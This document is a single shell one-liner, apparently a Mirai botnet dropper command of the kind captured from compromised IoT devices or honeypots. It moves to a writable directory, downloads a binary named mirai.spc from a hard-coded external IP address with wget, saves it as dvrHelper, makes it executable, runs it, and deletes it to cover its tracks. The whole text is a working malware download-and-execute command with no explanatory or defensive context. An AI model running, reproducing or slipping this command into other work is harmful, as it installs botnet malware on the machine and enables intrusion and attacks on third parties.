cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://120.92.90.235/ghf/mirai.spc -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
